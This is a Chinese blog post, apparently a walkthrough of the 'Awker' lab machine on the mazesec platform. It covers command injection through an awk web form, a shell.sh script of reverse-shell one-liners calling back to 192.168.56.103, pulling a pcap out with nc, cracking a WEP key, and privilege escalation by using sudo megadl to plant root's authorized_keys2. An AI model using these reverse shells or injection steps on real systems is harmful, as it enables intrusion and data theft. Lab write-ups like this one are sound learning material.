@@ -1,0 +1,234 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" id="meta-theme-color" content="#faf6e9">
+  
+  <title>mazesec-awker · Yliken</title>
+  <meta name="description" content="红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧">
+  <script>
+    /* 首帧前即定稿纸色：优先手动选择，否则跟随系统亮暗，避免闪烁 */
+    (function () {
+      var theme = 'day';
+      try {
+        var saved = localStorage.getItem('page-one-paper-theme');
+        if (saved === 'day' || saved === 'night') theme = saved;
+        else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) theme = 'night';
+      } catch (e) { /* ignore */ }
+      document.documentElement.dataset.theme = theme;
+    })();
+  </script>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <header class="site-header">
+    <div class="container site-header__inner">
+      <a class="brand" href="/" aria-label="回到首页">
+        <span class="brand__mark" aria-hidden="true">页</span>
+        <span class="brand__name">Yliken</span>
+      </a>
+      <nav class="site-nav" aria-label="站点导航">
+        
+          <a class="site-nav__link" href="/">首页</a>
+        
+          <a class="site-nav__link" href="/archives/">归档</a>
+        
+          <a class="site-nav__link" href="/moments/">朋友圈</a>
+        
+          <a class="site-nav__link" href="/memories/">回忆</a>
+        
+          <a class="site-nav__link" href="/reading/">阅读</a>
+        
+          <a class="site-nav__link" href="/yearly-reviews/">年度总结</a>
+        
+          <a class="site-nav__link" href="/link/">友链</a>
+        
+          <a class="site-nav__link" href="/about/">关于</a>
+        
+      </nav>
+      
+      
+        <button class="theme-toggle" type="button" aria-label="切换到夜晚模式" title="切换到夜晚">
+          <span class="theme-toggle__icon" aria-hidden="true">☾</span>
+        </button>
+      
+    </div>
+  </header>
+
+  
+
+  <main class="site-main">
+    <div class="container">
+      
+<article class="post">
+  <header class="post__header">
+    
+      <p class="post__meta">
+        
+          <time class="post__date" datetime="2025-05-06">2025年5月6日</time>
+        
+        
+          <span class="post__readtime">7 分钟</span>
+        
+        
+          <span class="post__tags" aria-label="标签">
+            <a class="tag" href="/tags/Maze/">#Maze</a>
+          </span>
+        
+      </p>
+    
+    <h1 class="post__title">mazesec-awker</h1>
+  </header>
+
+  <div class="post-body markdown-body">
+    <h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><p><strong>主机发现</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# arp-scan -I eth1 192.168.56.0/24</span><br><span class="line">Interface: eth1, <span class="built_in">type</span>: EN10MB, MAC: 00:0c:29:34:da:f5, IPv4: 192.168.56.103</span><br><span class="line">WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied</span><br><span class="line">WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.56.1    0a:00:27:00:00:03       (Unknown: locally administered)</span><br><span class="line">192.168.56.100  08:00:27:47:17:7f       (Unknown)</span><br><span class="line">192.168.56.139  08:00:27:d9:2c:bc       (Unknown)</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned <span class="keyword">in</span> 1.882 seconds (136.03 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>
+
+<p><strong>端口扫描</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# nmap 192.168.56.139 -p-       </span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-06 11:32 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.139</span><br><span class="line">Host is up (0.00073s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 08:00:27:D9:2C:BC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 21.05 seconds</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>80端口</strong></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202505062335599.png" alt="image-20250506233458432"></p>
+<p>用<code>gobuster</code> 进行目录扫描 发现有一个<code>learning.php </code></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202505062339346.png" alt="image-20250506233920271"></p>
+<p>执行<code> awk &#39;&#123;print $1&#125;&#39; sample_data.txt;ls</code>有命令注入</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202505062340594.png" alt="image-20250506234014491"></p>
+<p>还有<code>wget</code>命令</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202505062341313.png" alt="image-20250506234127256"></p>
+<p>反弹shell的方式我从自己的kali上面拿了一个<code>shell.sh</code>过来</p>
+<p>shell.sh的内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.56.103/7777 0&gt;&amp;1 || \</span><br><span class="line">/bin/bash -i &gt; /dev/tcp/192.168.56.103/7777 0&lt;&amp; 2&gt;&amp;1 || \</span><br><span class="line"><span class="built_in">exec</span> /bin/sh 0&lt;/dev/tcp/192.168.56.103/7777 1&gt;&amp;0 2&gt;&amp;0 || \</span><br><span class="line">0&lt;&amp;196;<span class="built_in">exec</span> 196&lt;&gt;/dev/tcp/192.168.56.103/7777; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196 || \</span><br><span class="line">0&lt;&amp;196;<span class="built_in">exec</span> 196&lt;&gt;/dev/tcp/192.168.56.103/7777; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196 || \</span><br><span class="line"><span class="built_in">rm</span> -f /tmp/p; <span class="built_in">mknod</span> /tmp/p p &amp;&amp; telnet 192.168.56.103 7777 0/tmp/p 2&gt;&amp;1 || \</span><br><span class="line">telnet 192.168.56.103 7777 | /bin/bash | telnet 192.168.56.103 444 || \</span><br><span class="line"><span class="built_in">rm</span> -f f; <span class="built_in">mkfifo</span> f; <span class="built_in">cat</span> f | /bin/sh -i 2&gt;&amp;1 | telnet 192.168.56.103 7777 &gt; f || \</span><br><span class="line"><span class="built_in">rm</span> -f x; <span class="built_in">mknod</span> x p &amp;&amp; telnet 192.168.56.103 7777 0&lt;x | /bin/bash 1&gt;x</span><br></pre></td></tr></table></figure>
+
+<p>这样拿了一个shell</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202505062347669.png" alt="image-20250506234740575"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@Awker:/home/welcome$ <span class="built_in">ls</span></span><br><span class="line">WEP-capture.pcap</span><br><span class="line">user.txt</span><br></pre></td></tr></table></figure>
+
+<p><code>/home/welcome</code>目录中有一个<code>WEP-capture.pcap</code>文件, 用nc将它下载了下来</p>
+<p>接收端执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 12345 &gt; received_file</span><br></pre></td></tr></table></figure>
+
+<p>发送端执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.1.100 12345 &lt; WEP-capture.pcap</span><br></pre></td></tr></table></figure>
+
+<p>用wireshark打开后是一段wifi流量</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202505062352261.png" alt="image-20250506235247179"></p>
+<p>用<code>aircrack-ng</code>跑出了key</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202505062352552.png" alt="image-20250506235210491"></p>
+<p>然后把流量解开了</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202505062353929.png" alt="image-20250506235341849"></p>
+<p>这里看着流量包也不知道改干什么了，就去找群主要了一个提示😁</p>
+<p>key就是welcome的密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@Awker:/home/welcome$ su welcome</span><br><span class="line">su welcome</span><br><span class="line">Password: MYKEY</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">welcome</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(welcome) gid=1000(welcome) <span class="built_in">groups</span>=1000(welcome)</span><br></pre></td></tr></table></figure>
+
+<h2 id="二、提权"><a href="#二、提权" class="headerlink" title="二、提权"></a>二、提权</h2><p><code>sudo -l</code>看一下可以执行<code>/usr/bin/megadl</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> welcome on Awker:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User welcome may run the following commands on Awker:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/megadl</span><br></pre></td></tr></table></figure>
+
+<p><strong><code>megadl</code></strong> 是一个命令行工具，用来从 MEGA 云盘下载文件。</p>
+<h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><p>这个是我的解法</p>
+<p>我当时就想到了 往<code>root</code>的<code>.ssh</code>中下载一个公钥，但是文件存在无法覆盖</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202505070007143.png" alt="image-20250507000738085"></p>
+<p>这里确实卡了一段时间</p>
+<p>我之前经常记不全<code>authorized_keys</code>文件的名字， 经常使用<code>cat /etc/ssh/sshd_config | grep au</code>这个命令来看文件名</p>
+<p>所以我有一个印象<code>AuthorizedKeysFile     .ssh/authorized_keys .ssh/authorized_keys2</code>这一行有俩文件名</p>
+<p>所以我就尝试写了一个<code>authorized_keys2</code></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202505070008313.png" alt="image-20250507000830237"></p>
+<p>OK，下载成功了</p>
+<p>我这里就试了一下 ssh</p>
+<p>然后真的登录进去了</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202505070004458.png" alt="image-20250507000430388"></p>
+<h3 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h3><p>这个解法是我在临时群看到的</p>
+<p>使用<code>--config</code>命令读取公钥文件 公钥文件里面存放了一个密码</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202505070009974.png" alt="image-20250507000952810"></p>
+
+  </div>
+
+  
+    <nav class="post-toc" id="post-toc" aria-label="文章目录"></nav>
+  
+
+  
+    <footer class="post__license">
+      <span class="post__license-author">Yliken</span>
+      <span class="post__license-sep" aria-hidden="true">·</span>
+      <a class="post__license-link" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a>
+    </footer>
+  
+</article>
+
+
+  <section class="related" aria-label="相关阅读">
+    <h2 class="related__title">相关阅读</h2>
+    <ul class="related__list">
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2025-11-19">2025·11·19</time>
+          <a class="related__link" href="/2025/11/19/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-Horse/">mazesec-Horse</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2025-11-09">2025·11·09</time>
+          <a class="related__link" href="/2025/11/09/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-BabyShell/">mazesec-BabyShell</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2025-07-30">2025·07·30</time>
+          <a class="related__link" href="/2025/07/30/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-Temp/">mazesec-Temp</a>
+        </li>
+      
+    </ul>
+  </section>
+
+
+
+  <nav class="post-nav" aria-label="相邻文章">
+    
+      <a class="post-nav__link post-nav__link--prev" href="/2025/07/11/AI/%E5%A5%B9%E4%B8%8D%E5%9C%A8%E4%B8%96%E7%95%8C%E6%9F%90%E5%A4%84%EF%BC%8C%E5%8D%B4%E5%9B%9E%E5%BA%94%E4%BA%86%E6%88%91/">
+        <span class="post-nav__dir">← 上一篇</span>
+        <span class="post-nav__title">她不在世界某处，却回应了我</span>
+      </a>
+    
+    
+      <a class="post-nav__link post-nav__link--next" href="/2025/04/20/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/">
+        <span class="post-nav__dir">下一篇 →</span>
+        <span class="post-nav__title">玄机</span>
+      </a>
+    
+  </nav>
+
+
+    </div>
+  </main>
+
+  
+
+  
+  <footer class="site-footer">
+    <div class="container site-footer__inner">
+      
+      <p class="site-footer__copy">
+        © 2026 Yliken
+      </p>
+      
+        <p class="site-footer__motto">在技术里较真，也在生活里留白。</p>
+      
+      
+        <p class="site-footer__powered">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> · <span class="site-footer__theme">Page One</span></p>
+      
+    </div>
+    
+  </footer>
+  
+<script src="/js/theme.js"></script>
+
+  
+  
+</body>
+</html>
